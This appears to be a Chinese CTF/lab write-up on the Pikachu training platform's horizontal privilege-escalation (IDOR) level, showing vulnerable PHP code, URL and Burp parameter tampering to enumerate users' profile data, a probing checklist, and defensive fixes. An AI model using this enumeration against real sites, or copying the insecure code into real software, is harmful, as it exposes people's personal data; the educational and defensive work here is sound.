---
layout: post
title: Pikachu - Over Permission 水平越权 Writeup（认证 ≠ 授权）
platform: pikachu
date: 2026-10-29 20:31:00 +0800
categories: CTF
---

Pikachu - Over Permission 水平越权 Writeup（认证 ≠ 授权）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Over Permission → 水平越权
- 地址：`http://localhost/pikachu/vul/overpermission/op1/op1_login.php`
- 题型：Web
- 考点：**水平越权（IDOR）**、认证与授权的区别

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu（member 表）
```

**页面形态**：

```text
Please Enter Your Information
[Username]
[Password]
[Login]
```

**作者提示**：

```html
data-content="lucy/123456,lili/123456,kobe/123456"
```

**登录后的页面**：

```text
欢迎来到个人信息中心 | 退出登录

[点击查看个人信息]

hello,lucy,你的具体信息如下：
姓名:lucy
性别:girl
手机:12345678922
住址:usa
邮箱:lucy@pikachu.com
```

**✅ 实测结果（用 lucy 的登录态，改 username 参数）**

| 提交的 `username` | 返回的信息 |
|---|---|
| `lucy`（自己的）| 姓名=lucy，性别=girl，手机=12345678922，住址=usa |
| **`vince`** | **姓名=vince，性别=boy，手机=18626545453，住址=chain** ✅ |
| **`kobe`** | **姓名=kobe，性别=boy，手机=15988767673，住址=nba lakes** ✅ |
| **`lili`** | **姓名=lili，性别=girl，手机=18656565545，住址=usa** ✅ |
| **`allen`** | **姓名=allen，性别=boy，手机=13676767767，住址=nba 76** ✅ |

**★ 整个过程中登录态一直是 lucy，但返回的是别人的信息。**

二、题目分析

**① ⭐ 核心概念：认证（Authentication）vs 授权（Authorization）**

**★ 这是本关最重要的知识点，也是很多漏洞的根源。**

| | 认证（Authentication）| 授权（Authorization）|
|---|---|---|
| 回答的问题 | **你是谁？** | **你能做什么？** |
| 例子 | 登录、验证密码、验 token | "只能看自己的订单"、"管理员才能删用户" |
| 失败后果 | 未登录也能访问 | **登录了也能干不该干的事** |
| 本关 | ✅ **做了** | ❌ **没做** |

**★ 本关的情况**：

```php
// op1_mem.php
if(!check_op_login($link)){
    header("location:op1_login.php");     // ★ 认证：检查"你登录了没"
}
// ... 然后 ...
$username = $_GET['username'];             // ★ 授权：完全没检查"你能不能看这个人的信息"
```

**★ 一句话总结**：

```
"你登录了" ≠ "你能看别人的信息"
★ 本关只做了前半句，漏了后半句
```

**② 漏洞代码：身份来源搞错了**

```php
<?php
// op1_mem.php 第 24-48 行
$html = '';
if(isset($_GET['submit']) && $_GET['username'] != null){
    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
    $username = escape($link, $_GET['username']);          // ★ 身份来自 GET 参数
    $query = "select * from member where username='$username'";
    $result = execute($link, $query);
    if(mysqli_num_rows($result) == 1){
        $data = mysqli_fetch_assoc($result);
        $uname    = $data['username'];
        $sex      = $data['sex'];
        $phonenum = $data['phonenum'];
        $add      = $data['address'];
        $email    = $data['email'];

        $html .= <<<A
<div id="per_info">
   <h1 class="per_title">hello,{$uname},你的具体信息如下：</h1>
   <p class="per_name">姓名:{$uname}</p>
   <p class="per_sex">性别:{$sex}</p>
   <p class="per_phone">手机:{$phonenum}</p>
   <p class="per_add">住址:{$add}</p>
   <p class="per_email">邮箱:{$email}</p>
</div>
A;
    }
}
?>
```

**★ 作者的注释已经点破了**：

```
"没有使用session来校验,而是使用的传进来的值，权限校验出现问题"
"这里应该跟登录态关系进行绑定"
```

**★ 正确写法（对比）**：

```php
// ❌ 本关：用传入的参数当身份
$username = escape($link, $_GET['username']);
$query = "select * from member where username='$username'";

// ✅ 正确：用 session 里的身份
$username = $_SESSION['op']['username'];         // ★ 身份来自服务端
$query = "select * from member where username='$username'";

// ✅ 或者：如果确实要看别人的（比如管理员），加权限判断
if ($_GET['username'] !== $_SESSION['op']['username'] && !is_admin()) {
    die('无权查看他人信息');
}
```

**★ 核心原则**：

```
"我是谁" → 必须来自【服务端】（session / token）
"我要看什么" → 可以来自【客户端】（参数）
★ 但"能不能看" → 必须由服务端【判断】
```

**③ 隐藏域不是防护**

**★ 页面上的表单**：

```html
<form class="msg1" method="get">
    <input type="hidden" name="username" value="<?php echo $_SESSION['op']['username']; ?>" />
    <input type="submit" name="submit" value="点击查看个人信息" />
</form>
```

**★ 开发者可能觉得**：

```
"username 是 hidden 的，用户看不到，也改不了"
★ 这是彻底的误解
```

**★ 实际**：

```
① F12 元素面板 → 双击 value → 随便改成谁
② 或者直接改地址栏（因为 method="get"，参数全在 URL 里）
③ 或者用 Burp 改包
④ 甚至直接手写请求

★ hidden 只是"不显示给用户看"
★ 请求发出去之后，参数完全由客户端决定
```

**★ 一个更直观的验证**：

```
?username=vince&submit=1
              └──┬──┘
        submit 的值是什么都不影响
        因为代码只判断 isset($_GET['submit'])
```

**④ 登录检查为什么"看起来有，其实没用"**

**★ 代码**：

```php
if(!check_op_login($link)){
    header("location:op1_login.php");
}
```

**★ `check_op_login()` 的实现**：

```php
function check_op_login($link){
    if(isset($_SESSION['op']['username']) && isset($_SESSION['op']['password'])){
        $query = "select * from member where username='{$_SESSION['op']['username']}'
                  and sha1(pw)='{$_SESSION['op']['password']}'";
        $result = execute($link, $query);
        if(mysqli_num_rows($result) == 1){
            return true;        // ★ 只验证"这个 session 对应的用户存在且密码对"
        }
    }
    return false;
}
```

**★ 它检查了什么**：

```
✅ session 里有 username / password
✅ 这个用户真的存在
✅ 密码哈希对得上
★ 结论：你确实登录了 —— 但"你是谁"它知道，"你要看谁"它不管
```

**★ 一个类比**：

```
你拿着"员工卡"进公司（认证 ✅）
然后你走到财务室，把别人的工资单拿走了（授权 ❌）
★ 门禁只管"你是不是员工"
★ 不管"你能不能进财务室"
```

**⑤ 这就是 IDOR（Insecure Direct Object Reference）**

**★ 本关的漏洞有个更通用的名字**：

```
IDOR = 不安全的直接对象引用
     = 直接把"对象的标识"暴露给用户，且不检查"用户有没有权限访问"

本关的对象标识：username
常见的对象标识：id / uid / order_id / file_id / phone / email
```

**★ 一个典型的 IDOR 场景**：

```
下载发票： /download?invoice_id=1001
    ↓ 改成 1002 → 看到别人的发票
★ 和本关的"改 username"是同一类问题
```

三、解题步骤

**第 1 步：登录（用提示给的账号）**

```text
① 打开 http://localhost/pikachu/vul/overpermission/op1/op1_login.php
② 输入：lucy / 123456
③ 点 Login
④ 跳到 op1_mem.php（个人信息中心）
```

**★ 注意**：如果显示"登录失败"，检查是不是密码打错了，或者账号不在 `member` 表里。

**★ 可用的账号（提示给的）**：

```
lucy / 123456
lili / 123456
kobe / 123456
★ 其实 member 表的 7 个用户密码都是 123456
```

**第 2 步：看自己的信息（正常流程）**

```text
① 点"点击查看个人信息"
② 看到：
   hello,lucy,你的具体信息如下：
   姓名:lucy
   性别:girl
   手机:12345678922
   住址:usa
   邮箱:lucy@pikachu.com
```

**★ 看 URL**：

```
op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
              └──┬──┘
        ★ 用户名在 URL 里！
```

**第 3 步：⭐ 改成别人（越权）**

**★ 方式 A：改地址栏（最快）**

**★ 把 `lucy` 改成 `vince`**：

```
http://localhost/pikachu/vul/overpermission/op1/op1_mem.php?username=vince&submit=1
```

**★ 预期结果**：

```text
hello,vince,你的具体信息如下：
姓名:vince
性别:boy
手机:18626545453
住址:chain
邮箱:vince@pikachu.com
```

**★ 方式 B：F12 改隐藏域**

```text
① F12 → 元素 → 搜索 "hidden"
② 找到：
   <input type="hidden" name="username" value="lucy">
③ 双击 value="lucy" → 改成 "vince" → 回车
④ 点"点击查看个人信息"
⑤ 看到 vince 的信息
```

**★ 方式 C：Burp 抓包改**

```text
① 点"点击查看个人信息" → Burp 抓包
② 请求行：
   GET /pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&submit=... HTTP/1.1
③ 把 lucy 改成 kobe
④ Forward
⑤ 看到 kobe 的信息
```

**第 4 步：⭐ 遍历所有用户（放大危害）**

**★ member 表的 7 个用户**（第 19 关拖库时已知）：

```
vince / allen / kobe / grady / kevin / lucy / lili
```

**★ 逐个访问**：

```
?username=vince&submit=1
?username=allen&submit=1
?username=kobe&submit=1
?username=grady&submit=1
?username=kevin&submit=1
?username=lili&submit=1
```

**★ 就能拿到全站用户的：真实姓名、性别、手机号、住址、邮箱。**

**★ 实测数据**：

```text
vince → boy  18626545453  chain       vince@pikachu.com
allen → boy  13676767767  nba 76      allen@pikachu.com
kobe  → boy  15988767673  nba lakes   kobe@pikachu.com
grady → boy  13676765545  nba hs      grady@pikachu.com
kevin → boy  13677676754  Oklahoma City Thunder  kevin@pikachu.com
lucy  → girl 12345678922  usa         lucy@pikachu.com
lili  → girl 18656565545  usa         lili@pikachu.com
```

**★ 这在现实中的定性**：

```
· 个人信息泄露（姓名 + 手机号 + 住址 + 邮箱）
· 属于"高危"（《个人信息保护法》第 51 条要求"权限控制"）
· 在众测 / SRC 里通常按"中危～高危"评级
```

**第 5 步：完整 payload 汇总**

```
// ========== 登录 ==========
POST /op1_login.php
username=lucy&password=123456&submit=submit

// ========== 正常查看自己 ==========
GET /op1_mem.php?username=lucy&submit=1

// ========== 越权查别人 ==========
GET /op1_mem.php?username=vince&submit=1
GET /op1_mem.php?username=kobe&submit=1
GET /op1_mem.php?username=<任意用户名>&submit=1
```

四、延伸知识

**① 越权的完整分类**

**★ 越权（Broken Access Control）分三种**：

| 类型 | 定义 | 例子 |
|---|---|---|
| **水平越权** | 同级用户之间互相访问 | **本关：lucy 看 vince 的信息** |
| **垂直越权** | 低权限用户访问高权限功能 | 普通用户访问管理员页面 |
| **交叉越权** | 两种混合 | 普通用户 A 用管理员接口看用户 B |

**★ Pikachu 的两关正好对应前两种**：

```
水平越权（本关）：op1 → lucy 看 vince
垂直越权（下一关）：op2 → 普通用户进管理员页面
```

**★ OWASP Top 10 2021 里排第 1**：

```
A01:2021 - Broken Access Control
    ★ 越权是"最严重的 Web 漏洞类型"
    ★ 比 SQL 注入（A03）、XSS（A03）排名都高
```

**② 常见的越权"对象标识"**

**★ 只要请求里出现"某个对象的 ID"，就可能有越权**：

| 参数名 | 常见场景 | 越权后果 |
|---|---|---|
| `id` / `uid` | 用户资料 | 看他人资料 |
| `order_id` | 订单详情 | 看他人订单（含地址、电话）|
| `invoice_id` | 发票下载 | 下载他人发票 |
| `file_id` | 文件下载 | 下载他人文件 |
| `phone` | 短信验证 | 给他人发短信 / 查他人绑定 |
| `email` | 邮箱验证 | 改他人邮箱 |
| `username` | **本关** | **看他人信息** |
| `address_id` | 收货地址 | 看他人地址 |
| `message_id` | 站内信 | 看他人私信 |

**★ 一个实用的检查清单**：

```
① 找出所有"带 ID 参数"的请求
② 用 A 账号登录，把 ID 换成 B 账号的
③ 看能不能访问
④ 再试"ID 不存在"、"ID 是负数"、"ID 是别人的"
```

**③ 越权与"认证"的关系（最容易混）**

**★ 三种错误写法**：

**错误 1：完全不检查（本关）**

```php
$username = $_GET['username'];
$query = "select * from member where username='$username'";
// ★ 登录了就能查任何人
```

**错误 2：检查了登录，但没检查"是不是自己"**

```php
if (!is_logged_in()) die('请登录');
$user = get_user($_GET['id']);
// ★ 和本关一样，只是多了一层"必须登录"
```

**错误 3：靠"前端隐藏"当权限**

```html
<!-- 只有管理员能看到这个按钮 -->
<?php if ($is_admin): ?>
    <a href="/admin/delete_user?id=5">删除用户</a>
<?php endif; ?>
```

**★ 错误 3 的问题**：

```
按钮藏起来了，但 /admin/delete_user 这个接口没有任何权限检查
→ 普通用户直接访问 URL 就能删用户
★ 这就是"垂直越权"的典型（下一关要做的）
```

**★ 正确做法**：

```php
// 每个"敏感操作"都要在【服务端】做权限判断
function require_owner_or_admin($resource_user_id) {
    if ($_SESSION['uid'] !== $resource_user_id && !is_admin()) {
        http_response_code(403);
        die('无权访问');
    }
}
```

**④ 越权的"检测"方法（渗透测试视角）**

**方法 1：双账号对比**

```
① 注册两个账号 A 和 B
② 用 A 登录，记录所有"带 ID 的请求"
③ 把请求里的 ID 换成 B 的
④ 看能不能成功
★ 这是最经典的越权检测方法
```

**方法 2：换个"标识"试**

```
id=1001  → 1002（+1）
id=1001  → 1（最小值，通常是 admin）
id=1001  → -1（负数）
id=1001  → 1001'（SQL 注入）
id=1001  → 1001.0（浮点）
★ 看服务器行为有没有变化
```

**方法 3：看响应差异**

```
· 200 + 别人的数据 → 越权成功
· 403 / 302 → 有防护
· 500 → 可能有注入或崩溃
· 200 + 空数据 → 可能有过滤（但值得继续试）
```

**方法 4：用 UUID 判断"防护水平"**

```
如果 ID 是"自增数字" → 天然可枚举 → 高风险
如果 ID 是"UUID" → 难猜 → 但依然要检查权限（UUID 可能泄露）
★ UUID 不是"权限控制"，只是"降低可枚举性"
```

**⑤ 真实世界的越权案例**

**案例 1：某打车 App 的"行程详情"**

```
GET /api/trip?trip_id=12345
→ 改成别人的 trip_id → 看到他人的起终点、手机号
★ 典型水平越权
```

**案例 2：某银行的"账单下载"**

```
GET /statement?account=12345678
→ 改成别人的账号 → 下载他人账单
★ 高危（金融数据）
```

**案例 3：某 SaaS 的"成员管理"**

```
POST /api/team/member/delete  {"user_id": 999}
→ 普通成员能删任何成员（包括管理员）
★ 垂直越权 + 水平越权
```

**案例 4：某电商的"优惠券"**

```
GET /api/coupon/claim?coupon_id=888
→ 遍历 coupon_id → 领走所有优惠券
★ 业务逻辑越权（薅羊毛）
```

**★ 共同点**：

```
① 请求里有"对象标识"
② 服务端"信任"这个标识
③ 没有"这个对象属于当前用户吗"的检查
```

**⑥ 防御（四层）**

**❌ 本关的反面教材**：

```php
$username = escape($link, $_GET['username']);        // 身份来自客户端
$query = "select * from member where username='$username'";
```

**✅ 第 1 层：身份只从服务端取**

```php
// 如果用 session
$username = $_SESSION['op']['username'];

// 如果用 JWT
$username = $jwt_payload['username'];
```

**★ 原则**：

```
"我是谁" 永远不要从"请求参数"里取
★ 请求参数只能表示"我要操作哪个对象"，不能表示"我是谁"
```

**✅ 第 2 层：对"敏感操作"做归属校验**

```php
$target = escape($link, $_GET['username']);
$me     = $_SESSION['op']['username'];

if ($target !== $me && !is_admin()) {
    http_response_code(403);
    die('无权查看他人信息');
}
```

**✅ 第 3 层：用"不可枚举"的标识（辅助）**

```php
// 用 UUID 代替自增 ID
$order = get_order_by_uuid($_GET['uuid']);
// ★ 但依然要做"这个订单属于当前用户吗"的检查
```

**★ UUID 的作用**：

```
降低"枚举"的可能性
★ 它不是权限控制，只是"增加猜测难度"
★ UUID 可能泄露（邮件、日志、URL），所以不能替代归属校验
```

**✅ 第 4 层：统一的权限中间件（架构层面）**

```php
// 路由定义时声明"需要什么权限"
$router->get('/member/{username}', 'MemberController@show')
       ->middleware('auth')
       ->middleware('owner:username');     // ★ 自动校验"是不是本人"

// 或者用"策略（Policy）"
$this->authorize('view', $user);           // Laravel 风格的授权
```

**★ 好处**：

```
不用在每个接口里手写判断
→ 不会"漏掉某个接口"
★ 越权漏洞大多来自"某个接口忘了加检查"
```

**⑦ 本模块两关的关系**

| | 水平越权（本关）| 垂直越权（下一关）|
|---|---|---|
| 起点 | 普通用户 | 普通用户 |
| 目标 | **另一个普通用户** | **管理员** |
| 手段 | 改 ID 参数 | 改角色 / 访问管理接口 |
| 危害 | 信息泄露 | **权限提升 → 接管系统** |
| 修补 | 校验"对象归属" | 校验"角色权限" |

**★ 一句话**：

```
水平越权 = 横向（同级别）
垂直越权 = 纵向（向上升级）
★ 垂直越权更危险（能拿到管理权限）
```

五、总结

- **本题核心：`op1_mem.php` 用 `$_GET['username']` 当身份，而不是 `$_SESSION`，导致任何登录用户都能查别人的信息。**

- **一行漏洞代码 + 作者自己的注释**：

```php
if(isset($_GET['submit']) && $_GET['username'] != null){
    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定
    $username = escape($link, $_GET['username']);          // ★ 身份来自客户端
    $query = "select * from member where username='$username'";
```

- **⭐ 八个必记要点**：

```text
① 认证 ≠ 授权
   认证 = 你是谁（登录检查）  → 本关做了
   授权 = 你能做什么（权限检查）→ 本关没做
   ★ "登录了"不等于"能看别人的信息"

② 水平越权 = 同级用户互相访问
   本关：lucy 看 vince / kobe / allen
   ★ 对照下一关：垂直越权 = 普通用户访问管理员功能

③ 身份必须来自服务端
   $_SESSION / token / JWT   ✅
   $_GET['username'] / $_POST['uid']  ❌

④ 隐藏域不是防护
   hidden 只是"不显示"
   F12 / 改 URL / Burp 都能改
   ★ 而且本关 method="get"，参数直接在 URL 里

⑤ 登录检查只挡"外人"，不挡"内鬼"
   check_op_login() 只验证"你登录了"
   不验证"你要看的对象属于你"

⑥ IDOR 是这类漏洞的通用名字
   Insecure Direct Object Reference
   常见对象标识：id / order_id / invoice_id / username / phone

⑦ 危害：个人信息泄露
   本关泄露：姓名 + 手机号 + 住址 + 邮箱
   ★ 现实中属于高危（个人信息保护法）

⑧ 防御：身份从 session 取 + 归属校验 + 统一中间件
   ★ 越权漏洞大多是"某个接口忘了加检查"
```

- **实测数据**：

```text
用 lucy / 123456 登录后：

?username=lucy&submit=1    → lucy  girl 12345678922 usa        lucy@pikachu.com
?username=vince&submit=1   → vince boy  18626545453 chain      vince@pikachu.com
?username=kobe&submit=1    → kobe  boy  15988767673 nba lakes  kobe@pikachu.com
?username=lili&submit=1    → lili  girl 18656565545 usa        lili@pikachu.com
?username=allen&submit=1   → allen boy  13676767767 nba 76     allen@pikachu.com

★ submit 的值是什么都不影响（只要 isset 就行）
```

- **进度**：

```text
platform: pikachu   35 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，还剩 4 关）
└── Over Permission     1/2    ← 水平越权完成，还剩垂直越权
```

**手工复现要点**：

```text
· 登录 lucy / 123456
· 点"点击查看个人信息" → 看到 lucy 的信息，URL 里 username=lucy
· 改地址栏 username=vince → 看到 vince 的信息（越权成功）
· F12 改 hidden 的 value → 同样效果
· 遍历 vince/allen/kobe/grady/kevin/lili → 拿到全站用户信息
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  水平越权 = "登录了，但不是你"                                  │
│                                                            │
│  认证（你是谁）✅ 做了                                        │
│  授权（你能看谁）❌ 没做                                       │
│                                                            │
│  漏洞代码：                                                  │
│      $username = $_GET['username'];    ← 身份来自客户端       │
│      应该：$_SESSION['op']['username']  ← 身份来自服务端       │
│                                                            │
│  ★ 隐藏域不是防护（F12 / URL / Burp 都能改）                   │
│  ★ IDOR 是这类漏洞的通用名字                                  │
│  ★ 危害：个人信息泄露（高危）                                  │
│  ★ 防御：身份从 session 取 + 校验"对象归属"                    │
└────────────────────────────────────────────────────────────┘
```
